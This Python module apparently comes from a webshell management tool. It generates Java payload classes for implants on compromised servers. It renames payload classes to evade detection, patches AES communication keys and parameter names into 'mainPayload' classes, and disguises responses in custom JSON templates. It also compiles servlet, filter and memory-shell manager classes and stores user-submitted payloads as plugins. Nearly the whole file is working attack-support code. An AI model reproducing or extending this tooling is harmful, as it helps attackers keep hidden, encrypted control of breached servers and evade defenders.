import os
import re
import random
import string
import subprocess
from ..config import JSP_CLASSNAME_OBFUSCATION, JSP_SPECIFIED_CLASSNAME


class javaPayload:
    def __init__(self):
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.payload_dir = os.path.join(self.base_dir, "payload")
        self.custom_payload_dir = os.path.join(self.payload_dir, "custom")
        self.javac_path = os.path.join(self.payload_dir, "jdk/bin/javac")
        self.class_names_file = os.path.join(self.payload_dir, "classNames.txt")
        self.class_names = self._load_class_names()
        self.obfuscated_payload_dir = os.path.join(self.payload_dir, "obfuscated_payload")
        os.makedirs(self.custom_payload_dir, exist_ok=True)
        os.makedirs(self.obfuscated_payload_dir, exist_ok=True)
        
    def _load_class_names(self):
        """从文件中加载类名列表"""
        try:
            with open(self.class_names_file, 'r') as f:
                # 过滤掉空行
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"警告: {self.class_names_file} 未找到。 'dictionary' 混淆方法将不可用。")
            return []

    def generateRandomClassName(self, length=6):
        """设置随机类名"""
        # 首字母必须是字母
        first = random.choice(string.ascii_letters)
        # 后续字符可以是字母或数字
        rest = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length - 1))
        return first + rest

    def get_obfuscation_details(self, method, specified_name=None):
        """
        根据混淆方法获取类名、包名和路径详情。
        :param method: 'random', 'dictionary', or 'specified'
        :param specified_name: 当 method 为 'specified' 时使用
        :return: 包含 package, classname, java_path, class_path 的字典
        """
        package = None
        classname = None
        
        if method == 'random':
            classname = self.generateRandomClassName()
        elif method == 'dictionary':
            if not self.class_names:
                raise ValueError("类名列表为空或未加载。")
            full_name = random.choice(self.class_names)
            self.class_names.remove(full_name)  # 确保唯一性
            parts = full_name.split('.')
            classname = parts[-1]
            if len(parts) > 1:
                package = ".".join(parts[:-1])
        elif method == 'specified':
            if not specified_name:
                raise ValueError("使用 'specified' 方法时必须提供类名。")
            parts = specified_name.split('.')
            classname = parts[-1]
            if len(parts) > 1:
                package = ".".join(parts[:-1])
        else:
            raise ValueError(f"未知的混淆方法: {method}")

        return {'package': package, 'classname': classname}

    def obfuscate_class_name(self, original_java_path, original_classname, obfuscation_method='none', specified_name=None):
        """
        混淆类名
        :param original_java_path: 原始 Java 文件路径
        :param original_classname: 原始类名
        :param obfuscation_method: 混淆方法 ('random', 'dictionary', 'specified', 'none')
        :param specified_name: 当使用 'specified' 方法时要指定的类名
        :return: 混淆后的类名和java文件内容
        """
        if obfuscation_method == 'none':
            package = None
            classname = original_classname
        else:
            details = self.get_obfuscation_details(obfuscation_method, specified_name)
            package = details['package']
            classname = details['classname']
        

        with open(original_java_path, 'r', encoding='utf-8') as f:
            content = f.read()


        content = content.replace(original_classname, classname)

        if package:
            content = f"package {package};\n\n{content}"
        
        return {"classname": classname, "class_content": content}

    def extract_class_name_from_source(self, source_code):
        """
        从Java源码中提取类名
        :param source_code: Java源码
        :return: 类名
        """
        if not source_code or not str(source_code).strip():
            raise ValueError("Payload源码不能为空")

        source_code = str(source_code)
        class_patterns = [
            r'\bpublic\s+class\s+([A-Za-z_][A-Za-z0-9_]*)\b',
            r'\bclass\s+([A-Za-z_][A-Za-z0-9_]*)\b'
        ]

        for pattern in class_patterns:
            match = re.search(pattern, source_code)
            if match:
                return match.group(1)

        raise ValueError("无法从Payload源码中解析类名")

    
    # 生成随机字符串
    def generate_random_string(self, length=50):
        # 生成随机字符串
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return ''.join(random.choice(chars) for _ in range(random.randint(length//2, length)))    

    # javac编译java文件
    def compileJavaFile(self, java_full_path, class_path=None, java_version=8):
        """
        使用 javac 编译 java 文件。

        :param java_full_path: .java 源文件路径
        :param class_path: 可选，编译时 classpath（-cp）
        :param java_version: 目标 Java 语言级别，默认 8（产出 class file version 52，兼容 Java 8+）。
            通过 ``--release`` 同时约束源码 API 与字节码版本。传入 ``None`` 时不加 ``--release``，
            使用当前 javac 默认目标版本。
        """
        args = [self.javac_path]
        if java_version is not None:
            args.extend(['--release', str(int(java_version))])
        if class_path:
            args.extend(['-cp', class_path])
        args.append(java_full_path)

        debug_enabled = os.getenv('ETERNITY_DEBUG') == '1'

        # 捕获输出，非调试模式下不打印编译日志
        proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if debug_enabled:
            print(f"[DEBUG] 执行编译命令: {' '.join(args)}")
            if proc.stdout:
                print(proc.stdout.rstrip())
            if proc.stderr:
                print(proc.stderr.rstrip())

        if proc.returncode != 0:
            err_msg = proc.stderr.strip() if proc.stderr else ''
            raise Exception(f"Java 文件编译失败: {java_full_path}\n{err_msg}")

        
    def define_response_json(self, java_content, custom_json_template):
        """
        根据用户自定义的JSON模板修改Java代码中的createJsonResponse方法
        
        :param java_content: Java文件内容
        :param custom_json_template: 用户自定义的JSON模板，使用PAYLOAD_DATA作为占位符
        :return: 修改后的Java文件内容
        """
        if not custom_json_template or '${encrypted_data}' not in custom_json_template:
            print("[WARNING] 无效的JSON模板或缺少${encrypted_data}占位符，使用默认模板")
            return java_content
        
        # 查找createJsonResponse方法
        method_start_pattern = r'(\s+)(private String createJsonResponse\(String payloadData\) \{[^}]*?\{)'
        method_end_pattern = r'(\s+return jsonBuilder\.toString\(\);\s+\})'
        
        import re
        
        # 使用正则表达式查找方法的开始和结束
        start_match = re.search(method_start_pattern, java_content, re.DOTALL)
        end_match = re.search(method_end_pattern, java_content, re.DOTALL)
        
        if not start_match or not end_match:
            print("[WARNING] 未找到createJsonResponse方法，返回原始内容")
            return java_content
        
        # 解析用户JSON模板，提取字段
        try:
            import json
            json_data = json.loads(custom_json_template)
        except json.JSONDecodeError:
            print(f"[ERROR] JSON模板格式错误: {custom_json_template}")
            return java_content
        
        # 生成新的JSON构建代码
        indent = start_match.group(1)  # 保持原有缩进
        new_json_code = f"{indent}    StringBuilder jsonBuilder = new StringBuilder();\n"
        new_json_code += f"{indent}    jsonBuilder.append(\"{{\");\n"
        new_json_code += f"{indent}    boolean first = true;\n"
        
        for key, value in json_data.items():
            new_json_code += f"{indent}    if (!first) jsonBuilder.append(\",\");\n"
            if str(value) == "${encrypted_data}":
                # 这个字段包含实际的payload数据
                new_json_code += f'{indent}    jsonBuilder.append("\\"{key}\\":\\"").append(escapeJsonString(payloadData)).append("\\"");\n'
            else:
                # 这是静态字段
                if isinstance(value, str):
                    escaped_value = str(value).replace('"', '\\"').replace('\\', '\\\\')
                    new_json_code += f'{indent}    jsonBuilder.append("\\"{key}\\":\\"{escaped_value}\\"");\n'
                elif isinstance(value, (int, float)):
                    new_json_code += f'{indent}    jsonBuilder.append("\\"{key}\\":{value}");\n'
                elif isinstance(value, bool):
                    bool_str = "true" if value else "false"
                    new_json_code += f'{indent}    jsonBuilder.append("\\"{key}\\":{bool_str}");\n'
                else:
                    # 其他类型转为字符串
                    escaped_value = str(value).replace('"', '\\"').replace('\\', '\\\\')
                    new_json_code += f'{indent}    jsonBuilder.append("\\"{key}\\":\\"{escaped_value}\\"");\n'
            
            new_json_code += f"{indent}    first = false;\n"
        
        new_json_code += f"{indent}    jsonBuilder.append(\"}}\");\n"
        
        # 构建完整的新方法
        new_method_body = start_match.group(0) + "\n" + new_json_code
        
        # 替换原有方法体（从方法开始到return语句结束）
        full_method_pattern = r'(private String createJsonResponse\(String payloadData\) \{.*?return jsonBuilder\.toString\(\);\s+\})'
        replacement = new_method_body + "\n" + end_match.group(0)
        
        modified_content = re.sub(full_method_pattern, replacement, java_content, flags=re.DOTALL)
        
        print(f"[DEBUG] 成功应用自定义JSON模板，字段数量: {len(json_data)}")
        return modified_content

    def apply_custom_json_template(self, java_content, json_template):
        """
        为aes_base64_json类型的payload应用自定义JSON模板
        
        :param java_content: Java文件内容
        :param json_template: 自定义JSON模板字符串
        :return: 修改后的Java文件内容
        """
        try:
            java_content = self.define_response_json(java_content, json_template)
            print(f"[DEBUG] 应用自定义JSON模板: {json_template}")
        except Exception as e:
            print(f"[WARNING] 无法应用自定义JSON模板: {e}")

        return java_content


    def patch_payload_keys(self, java_content, secret_key, param_name):
        """
        patch mainPayload类中的通信密钥(sc)和参数名(pm)变量
        
        :param java_content: Java文件内容
        :param secret_key: 通信密钥
        :param param_name: 参数名
        :return: 修改后的Java文件内容
        """
        import re
        
        try:
            # patch sc变量（通信密钥）- 适用于mainPayload_aes_base64等
            # 匹配模式：String sc = "任意字符";
            sc_pattern = r'String\s+sc\s*=\s*"[^"]*"\s*;'
            new_sc = f'String sc = "{secret_key}";'
            java_content = re.sub(sc_pattern, new_sc, java_content)
            
            # patch xc变量（通信密钥）- 适用于mainPayload_aes_base64_json等
            # 匹配模式：String xc = null; 或 String xc = "任意字符";
            xc_pattern = r'String\s+xc\s*=\s*(?:null|"[^"]*")\s*;'
            new_xc = f'String xc = "{secret_key}";'
            java_content = re.sub(xc_pattern, new_xc, java_content)
            
            # patch pm变量（参数名）- 适用于mainPayload_aes_base64等
            # 匹配模式：String pm = "任意字符";
            pm_pattern = r'String\s+pm\s*=\s*"[^"]*"\s*;'
            new_pm = f'String pm = "{param_name}";'
            java_content = re.sub(pm_pattern, new_pm, java_content)
            
            # patch pass变量（参数名）- 适用于mainPayload_aes_base64_json等
            # 匹配模式：String pass = null; 或 String pass = "任意字符";
            pass_pattern = r'String\s+pass\s*=\s*(?:null|"[^"]*")\s*;'
            new_pass = f'String pass = "{param_name}";'
            java_content = re.sub(pass_pattern, new_pass, java_content)
            
            print(f"[DEBUG] 成功patch密钥: sc='{secret_key}', pm/pass='{param_name}'")
            return java_content
            
        except Exception as e:
            print(f"[ERROR] patch密钥失败: {e}")
            return java_content

    def getPayload(self,class_name="mainPayload_aes_base64",obfuscation_method=JSP_CLASSNAME_OBFUSCATION,specified_name=JSP_SPECIFIED_CLASSNAME,json_template=None,secret_key=None,param_name=None):
        """
        获取payload
        :param class_name: 类名
        :param obfuscation_method: 混淆方法
        :param specified_name: 指定类名
        :param webshell_id: webshell ID
        :param secret_key: 通信密钥
        :param param_name: 参数名
        :param custom_json_template: 自定义JSON模板
        :return: 包含类名和类内容的字典
        """
        
        payload_file = os.path.join(self.payload_dir, f"{class_name}.java")
        
        # 混淆类名
        obfuscated_result = self.obfuscate_class_name(payload_file,class_name,obfuscation_method,specified_name)
        payload_obfuscated_classname = obfuscated_result["classname"]
        payload_java_content = obfuscated_result["class_content"]
       
         # patch通信密钥和参数名
        if "mainPayload" in class_name:
            payload_java_content = self.patch_payload_keys(payload_java_content,secret_key,param_name)
        
        # 应用自定义JSON模板
        if 'aes_base64_json' in class_name.lower():
            payload_java_content = self.apply_custom_json_template(payload_java_content,json_template)

        # 写入java文件
        obfuscated_payload_java_file = os.path.join(self.obfuscated_payload_dir, f"{payload_obfuscated_classname}.java")
        with open(obfuscated_payload_java_file, 'w', encoding='utf-8') as f:
            f.write(payload_java_content)

        # 如果类名是AES_BASE64，则需要编译class_path
        if class_name in ("SERVLET", "MemoryShellManage", "FILTER"):
            class_path = os.path.join(self.payload_dir, 'lib/jsp-api-2.2.jar') + ":" + os.path.join(self.payload_dir, 'lib/servlet-api.jar')
            self.compileJavaFile(obfuscated_payload_java_file, class_path=class_path)
        else:
            self.compileJavaFile(obfuscated_payload_java_file)

        # 读取class文件
        obfuscated_payload_class_file = os.path.join(self.obfuscated_payload_dir, f"{payload_obfuscated_classname}.class")
        with open(obfuscated_payload_class_file, 'rb') as f:
            payload_class_content = f.read()
        
        # 删除java文件
        os.remove(obfuscated_payload_java_file)
        os.remove(obfuscated_payload_class_file)

        return {"classname": payload_obfuscated_classname, "class_content": payload_class_content}

    def saveCustomPayload(self, source_code):
        """
        保存自定义payload源码到custom目录
        :param source_code: 用户提交的Java源码
        :return: 保存后的基础信息
        """
        class_name = self.extract_class_name_from_source(source_code)
        payload_file = os.path.join(self.custom_payload_dir, f"{class_name}.java")

        with open(payload_file, 'w', encoding='utf-8') as f:
            f.write(str(source_code))

        return {
            "plugin_name": class_name,
            "class_name": class_name,
            "file_path": payload_file
        }

    def getCustomPayloadCode(self, plugin_name):
        """
        获取已保存的自定义payload源码
        :param plugin_name: 插件名
        :return: 源码内容和类名
        """
        if not plugin_name or not str(plugin_name).strip():
            raise ValueError("插件名不能为空")

        plugin_name = str(plugin_name).strip()
        payload_file = os.path.join(self.custom_payload_dir, f"{plugin_name}.java")
        if not os.path.exists(payload_file):
            raise ValueError(f"插件 {plugin_name} 不存在")

        with open(payload_file, 'r', encoding='utf-8') as f:
            source_code = f.read()

        class_name = self.extract_class_name_from_source(source_code)
        return {
            "plugin_name": plugin_name,
            "class_name": class_name,
            "source_code": source_code,
            "file_path": payload_file
        }

    def listCustomPayloads(self):
        """
        获取自定义payload列表
        :return: 插件列表
        """
        payload_list = []
        for file_name in sorted(os.listdir(self.custom_payload_dir)):
            if not file_name.endswith('.java'):
                continue

            file_path = os.path.join(self.custom_payload_dir, file_name)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    source_code = f.read()
                class_name = self.extract_class_name_from_source(source_code)
            except Exception:
                class_name = os.path.splitext(file_name)[0]

            stat = os.stat(file_path)
            payload_list.append({
                "pluginName": os.path.splitext(file_name)[0],
                "className": class_name,
                "fileName": file_name,
                "updatedAt": stat.st_mtime
            })

        payload_list.sort(key=lambda item: item["updatedAt"], reverse=True)
        return payload_list

    def deleteCustomPayload(self, plugin_name):
        """
        删除自定义payload源码
        :param plugin_name: 插件名
        :return: 删除结果
        """
        if not plugin_name or not str(plugin_name).strip():
            raise ValueError("插件名不能为空")

        plugin_name = str(plugin_name).strip()
        payload_file = os.path.join(self.custom_payload_dir, f"{plugin_name}.java")
        if not os.path.exists(payload_file):
            raise ValueError(f"插件 {plugin_name} 不存在")

        os.remove(payload_file)
        return True

    def getCustomPayload(self, source_code, obfuscation_method=JSP_CLASSNAME_OBFUSCATION, specified_name=JSP_SPECIFIED_CLASSNAME):
        """
        获取自定义payload
        :param source_code: 用户提交的Java源码
        :param obfuscation_method: 混淆方法
        :param specified_name: 指定类名
        :return: 包含类名和类内容的字典
        """
        if not source_code or not str(source_code).strip():
            raise ValueError("Payload源码不能为空")

        source_code = str(source_code)
        class_name = self.extract_class_name_from_source(source_code)

        # 将用户源码持久化到custom目录，便于后续作为插件进行复用
        payload_info = self.saveCustomPayload(source_code)
        payload_file = payload_info["file_path"]

        obfuscated_result = self.obfuscate_class_name(
            payload_file,
            class_name,
            obfuscation_method,
            specified_name
        )
        payload_obfuscated_classname = obfuscated_result["classname"]
        payload_java_content = obfuscated_result["class_content"]

        obfuscated_payload_java_file = os.path.join(
            self.obfuscated_payload_dir,
            f"{payload_obfuscated_classname}.java"
        )
        with open(obfuscated_payload_java_file, 'w', encoding='utf-8') as f:
            f.write(payload_java_content)

        self.compileJavaFile(obfuscated_payload_java_file)

        obfuscated_payload_class_file = os.path.join(
            self.obfuscated_payload_dir,
            f"{payload_obfuscated_classname}.class"
        )
        with open(obfuscated_payload_class_file, 'rb') as f:
            payload_class_content = f.read()

        os.remove(obfuscated_payload_java_file)
        os.remove(obfuscated_payload_class_file)

        return {"classname": payload_obfuscated_classname, "class_content": payload_class_content}
    

def main():
    Payload = javaPayload()
    payload_info = Payload.getPayload("PortMapping")
    
    """ print("测试方法 1: 生成随机类名...") 
    random_payload = Payload.get_jzip_payload(obfuscation_method='random')
    print(f"成功获取随机类名 payload，大小: {len(random_payload)} 字节\n") """

    """ print("测试方法 2: 从字典中选择类名...")
    try:
        dict_payload = Payload.get_jzip_payload(obfuscation_method='dictionary')
        print(f"成功获取字典类名 payload，大小: {len(dict_payload)} 字节\n")
    except ValueError as e:
        print(f"错误: {e}\n") """

    """ print("测试方法 3: 指定类名...")
    specified_name = "com.mycompany.myapp.CustomZipUtility"
    specified_payload = Payload.get_jzip_payload(obfuscation_method='specified', specified_name=specified_name)
    print(f"成功获取指定类名 ({specified_name}) payload，大小: {len(specified_payload)} 字节") """
    

    #测试编译java文件
    

if __name__ == "__main__":
    main()
